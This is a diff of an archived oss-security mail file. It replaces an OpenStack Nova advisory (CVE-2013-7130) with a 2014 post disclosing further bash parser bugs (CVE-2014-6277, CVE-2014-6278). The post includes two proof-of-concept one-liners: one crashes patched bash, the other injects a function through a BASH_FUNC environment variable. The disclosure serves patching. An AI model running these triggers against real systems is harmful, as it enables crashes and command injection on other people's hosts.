@@ -1,45 +1,37 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/01/23/5
-Message-ID: <1390495104.8188.18.camel@lappy>
-Date: Fri, 24 Jan 2014 02:38:24 +1000
-From: Grant Murphy <gmurphy@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/01/17
+Message-ID: <20141001202017.666b7d73@hboeck.de>
+Date: Wed, 1 Oct 2014 20:20:17 +0200
+From: Hanno Böck <hanno@...eck.de>
 To: oss-security@...ts.openwall.com
-Subject: [OSSA 2014-003] Live migration can leak root disk into ephemeral storage (CVE-2013-7130)
+Cc: Chet Ramey <chet.ramey@...e.edu>
+Subject: more bash parser bugs (CVE-2014-6277, CVE-2014-6278)
 Content-Type: text/plain; charset=utf-8
 
-OpenStack Security Advisory: 2014-003
-CVE: CVE-2013-7130
-Date: January 23, 2014
+Haven't seen it here yet. lcamtuf now disclosed details of the two
+further parser bugs he found:
+http://lcamtuf.blogspot.de/2014/10/bash-bug-how-we-finally-cracked.html
 
-Title: Live migration can leak root disk into ephemeral storage
-Reporter: Loganathan Parthipan (HP)
-Products: Nova
-Affects: All supported versions
+Basically if anyone hasn't applied one of the prefix patches yet now's
+the time to do so.
 
-Description:
-Loganathan Parthipan from Hewlett Packard reported a vulnerability in
-the Nova libvirt driver. By spawning a server with the same flavor as
-another user's migrated virtual machine, an authenticated user can
-potentially access that user's snapshot content resulting in information
-leakage. Only setups using KVM live block migration are affected.
+While prefixing should shield against them they should still be fixed
+for good.
 
+CVE-2014-6277 can still be triggered to segfault a fully patched bash:
+bash -c "f(){ x(){ _;}; x(){ _;}<<a;}"
 
-Icehouse (development branch) fix:
-https://review.openstack.org/#/c/68658/
+Second issue PoC on fully patched system:
+env BASH_FUNC_x%%='() { _;}>_[$($())] { echo vuln;}' bash -c :
 
-Havana (development branch) fix:
-https://review.openstack.org/#/c/68659/
-
-Grizzly fix:
-https://review.openstack.org/#/c/68660/
-
-
-References:
-http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-7130
-https://bugs.launchpad.net/nova/+bug/1251590
+(both likely not exploitable due to prefix shielding, but should be
+fixed anyway)
 
 -- 
-Grant Murphy
-OpenStack Vulnerability Management Team
+Hanno Böck
+http://hboeck.de/
 
-Download attachment "signature.asc" of type "application/pgp-signature" (231 bytes)
+mail/jabber: hanno@...eck.de
+GPG: BBB51E42
+
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
